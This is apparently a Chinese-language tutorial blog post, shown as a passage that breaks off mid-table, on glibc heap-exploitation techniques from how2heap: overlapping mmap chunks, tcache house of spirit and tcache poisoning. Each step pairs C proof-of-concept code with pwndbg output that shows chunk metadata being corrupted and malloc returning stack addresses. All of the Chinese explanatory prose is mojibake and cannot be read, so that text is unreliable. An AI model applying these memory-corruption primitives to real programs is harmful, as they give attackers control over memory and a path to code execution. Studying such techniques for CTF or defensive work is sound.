chunkså…¥é—¨çŸ¥è¯†    ==================================åœ¨GLibCä¸­ï¼Œæœ‰ä¸€ä¸ªç‚¹ï¼Œå½“ä¸€ä¸ªåˆ†é…æ˜¯å¦‚æ­¤ä¹‹å¤§ï¼Œä»¥è‡³äºmallocå†³å®šæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå•ç‹¬çš„å†…å­˜éƒ¨åˆ†æ¥å¤„ç†å®ƒï¼Œè€Œä¸æ˜¯åœ¨æ­£å¸¸çš„å †ä¸Šåˆ†é…å®ƒã€‚è¿™æ˜¯ç”± mmap_threshold var.ä»£æ›¿æ­£å¸¸çš„è·å–å—çš„é€»è¾‘ï¼Œç³»ç»Ÿè°ƒç”¨ Mmapã€‚è¿™å°†åˆ†é…ä¸€æ®µè™šæ‹Ÿå†…å­˜ï¼Œå¹¶æŠŠå®ƒè¿˜ç»™ç”¨æˆ·ã€‚åŒæ ·ï¼Œé‡Šæ”¾è¿‡ç¨‹ä¹Ÿä¼šæœ‰æ‰€ä¸åŒã€‚é‡Šæ”¾çš„å—ä¸æ˜¯è¿˜ç»™ä¸€ä¸ªbinæˆ–å †çš„å…¶ä»–éƒ¨åˆ†ï¼Œè€Œæ˜¯ä½¿ç”¨å¦ä¸€ä¸ªsyscallã€‚*Munmap*. å®ƒæ¥æ”¶ä¸€ä¸ªå…ˆå‰åˆ†é…çš„Mmapå—çš„æŒ‡é’ˆï¼Œå¹¶å°†å…¶é‡Šæ”¾å›å†…æ ¸ã€‚Mmap chunksåœ¨å¤§å°å…ƒæ•°æ®ä¸Šæœ‰ä¸€ä¸ªç‰¹æ®Šçš„ä½ï¼šç¬¬äºŒä½ã€‚å¦‚æœè¿™ä¸ªä½è¢«è®¾ç½®ï¼Œé‚£ä¹ˆè¿™ä¸ªå—å°±è¢«åˆ†é…ä¸ºä¸€ä¸ªMmapå—ã€‚Mmapåˆ†å—æœ‰ä¸€ä¸ªprev_sizeå’Œä¸€ä¸ªsizeã€‚å¤§å°*ä»£è¡¨å½“å‰çš„ åˆ†å—çš„å¤§å°ã€‚ä¸€ä¸ªchunkçš„*prev_size*è¡¨ç¤ºå‰©ä½™çš„ç©ºé—´ã€‚çš„å¤§å°ï¼ˆä¸æ˜¯ç›´æ¥ä½äºå¤§å°çš„åˆ†å—ï¼‰ã€‚ç„¶è€Œï¼Œfdå’ŒbkæŒ‡é’ˆå¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œå› ä¸ºMmap chunkså¹¶æ²¡æœ‰è¿”å›åˆ° çš„å¤§å°ï¼Œå°±åƒGLibC Mallocä¸­çš„å¤§å¤šæ•°å †å—ä¸€æ ·ã€‚é‡Šæ”¾åï¼Œ åˆ†å—å¿…é¡»æ˜¯é¡µé¢å¯¹é½çš„ã€‚ä¸‹é¢çš„POCæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªé‡å çš„chunkæ”»å‡»ï¼Œä½†åœ¨mmap chunksä¸Šã€‚è¿™å’Œhttps://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c éå¸¸ç›¸ä¼¼ã€‚ä¸»è¦çš„åŒºåˆ«æ˜¯ï¼Œmmapped chunksæœ‰ç‰¹æ®Šçš„å±æ€§ï¼Œå¹¶ä¸”æ˜¯ ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†ï¼Œåˆ›é€ å‡ºä¸æ­£å¸¸æƒ…å†µä¸‹ä¸åŒçš„æ”»å‡»åœºæ™¯ã€‚é‡å çš„åˆ†å—æ”»å‡»ã€‚è¿˜å¯ä»¥åšå…¶ä»–çš„äº‹æƒ…ã€‚å¦‚munmappingç³»ç»Ÿåº“ã€å †æœ¬èº«å’Œå…¶ä»–ä¸œè¥¿ã€‚è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„æ¦‚å¿µè¯æ˜ï¼Œç›®çš„æ˜¯ä¸ºäº†è¯æ˜ä¸€èˆ¬çš„ çš„æ–¹æ³•æ¥æ‰§è¡Œå¯¹ mmap åˆ†å—çš„æ”»å‡»ã€‚ å…³äºGLibCä¸­mmap chunksçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»è¿™ç¯‡æ–‡ç« ã€‚http://tukan.farm/2016/07/27/munmap-madness/</code></pre><p>é¦–å…ˆä½¿ç”¨ malloc åˆ†é…å‡ ä¸ªå¤§çš„ chunk :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">57</span> <span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line">  <span class="number">59</span></span><br><span class="line">  <span class="number">60</span> <span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">â–º <span class="number">61</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line">  <span class="number">63</span></span><br><span class="line">  <span class="number">64</span> <span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">  <span class="number">65</span> <span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥çŸ¥é“ mmap_chunk_3 çš„ preve size å’Œ size åˆ†åˆ«ä¸ºï¼š 0 å’Œ 0x101002</p><p>å‡è®¾æˆ‘ä»¬æ­¤æ—¶æœ‰ä¸€ä¸ªæ¼æ´å¯ä»¥ä¿®æ”¹ preve_size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">88</span> <span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">  <span class="number">89</span> <span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">â–º <span class="number">90</span> mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">  <span class="number">91</span> <span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">  <span class="number">92</span> <span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line">  <span class="number">93</span></span><br><span class="line">  <span class="number">94</span> <span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°† prev_size ä¿®æ”¹ä¸º 0x202002 , ç„¶åæˆ‘ä»¬ free mmap_chunk_3 , </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">102</span> Because of <span class="keyword">this</span> added restriction, the main goal is to get the memory back from the system</span><br><span class="line">  <span class="number">103</span> to have two pointers assigned to the same location.</span><br><span class="line">  <span class="number">104</span> */</span><br><span class="line">  <span class="number">105</span> <span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">â–º <span class="number">106</span> <span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line">  <span class="number">107</span></span><br><span class="line">  <span class="number">108</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  109 Would crash, if on the following:</span></span><br><span class="line"><span class="comment">  110 mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">  111 This is because the memory would not be allocated to the current program.</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å† malloc ä¸€ä¸ªå¤§å° 0x300000 ï¼Œ ç”±äºå‰é¢å‘ç”Ÿçš„åˆå¹¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª é‡å çš„ chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">120</span> <span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">121</span> <span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">   <span class="number">122</span> <span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line"> â–º <span class="number">123</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">   <span class="number">124</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">     â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">     pwndbg&gt; p overlapping_chunk</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">long</span> <span class="keyword">long</span> *) <span class="number">0x7f78b3e60010</span></span><br><span class="line">pwndbg&gt; p/x overlapping_chunk[<span class="number">-1</span>]</span><br><span class="line">$<span class="number">8</span> = <span class="number">0x301002</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä¿®æ”¹ overlapping_chunk çš„æ•°æ®å†…å®¹çš„åŒæ—¶ï¼Œå°±æ˜¯æŠŠ mmap_chunk_2 çš„å€¼ä¿®æ”¹äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">135</span> <span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line"> â–º <span class="number">136</span> <span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">137</span> <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">   <span class="number">138</span> <span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p/x mmap_chunk_2[<span class="number">0</span>]</span><br><span class="line">$<span class="number">14</span> = <span class="number">0x1122334455667788</span></span><br></pre></td></tr></table></figure><h3 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h3><p>é¦–å…ˆ malloc ä¸€ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span> <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line">  <span class="number">13</span></span><br><span class="line">  <span class="number">14</span> <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">15</span></span><br><span class="line">  <span class="number">16</span></span><br><span class="line">â–º <span class="number">17</span> <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">  <span class="number">18</span> <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨æ ˆä¸Šæˆ‘ä»¬æœ‰ä¸€ä¸ªå¯æ§ç›®æ ‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="number">21</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="number">22</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸ªå¯æ§ç›®æ ‡ä¼ªé€ æˆä¸€ä¸ªä¸€ä¸ªchunk ï¼Œä¿®æ”¹å…¶å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">28</span> fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br></pre></td></tr></table></figure><p>free è¿™ä¸ªä¼ªé€ çš„ chunk ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">34</span> a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">35</span></span><br><span class="line">  <span class="number">36</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">37</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">38</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±ä¼šå‘ç°ï¼Œåœ¨ tcache ä¸Šæœ‰ä¸€ä¸ªæ ˆåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7ffe02d9aa00</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å†malloc ä¸€æ¬¡ï¼Œå°±èƒ½æŠŠè¿™ä¸ªæ ˆåœ°å€æ‹¿å›æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /pwn/tcache_house_of_spirit.c</span><br><span class="line">   <span class="number">38</span></span><br><span class="line">   <span class="number">39</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">40</span> <span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">42</span></span><br><span class="line"> â–º <span class="number">43</span> assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">44</span> &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7ffe02d9a9e0</span> â€”â–¸ <span class="number">0x7ffe02d9aa00</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7ffe02d9a9f0</span> â€”â–¸ <span class="number">0x55c7abd8f040</span> â—‚â€” <span class="number">0x400000006</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7ffe02d9a9f8</span> â—‚â€” <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7ffe02d9aa00</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7ffe02d9aa10</span> â€”â–¸ <span class="number">0x7ffe02d9aa36</span> â—‚â€” <span class="number">0x55c7abd901200000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7ffe02d9aa18</span> â€”â–¸ <span class="number">0x55c7abd9040d</span> (__libc_csu_init+<span class="number">77</span>) â—‚â€” add    rbx, <span class="number">1</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55</span>c7abd90368 main+<span class="number">351</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>432c2890b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7ffe02d9aa00</span></span><br></pre></td></tr></table></figure><h3 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h3><p>é€šè¿‡åŠ«æŒä¿®æ”¹  tcache fd çš„å½¢å¼æ¥ï¼Œæ¥è·å–ä¸€ä¸ªç›®æ ‡åœ°å€,  è¿™é‡Œçš„ç›®æ ‡æ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œ ä½œç”¨äº 8 æŒºç›¸ä¼¼çš„</p><p>malloc ä¸¤ä¸ª chunk ï¼Œåˆ†åˆ«ä¸º a å’Œ b</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">21</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="number">23</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">  <span class="number">24</span> <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">â–º <span class="number">25</span> <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br></pre></td></tr></table></figure><p>ç„¶åå†ä¸€æ¬¡å°†ä»–ä»¬ free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">27</span> <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">   <span class="number">28</span> <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">29</span> <span class="built_in">free</span>(b);</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> â€”â–¸ <span class="number">0x55ce97ce62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å°±æœ‰å¦‚ä¸Šçš„é“¾è¡¨ç»“æ„ï¼Œå‡è®¾æˆ‘ä»¬å¯ä»¥æº¢å‡ºç¬¬ä¸€ä¸ª chunkï¼Œé‚£ä¹ˆä»¬å°±èƒ½ä¿®æ”¹ç¬¬äºŒä¸ª chunk çš„fd ,åˆ™æˆ‘ä»¬å°† chunk b çš„fd ä¿®æ”¹ä¸ºæ ˆåœ°å€,æ­¤æ—¶ tcachebins å°±å˜æˆå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 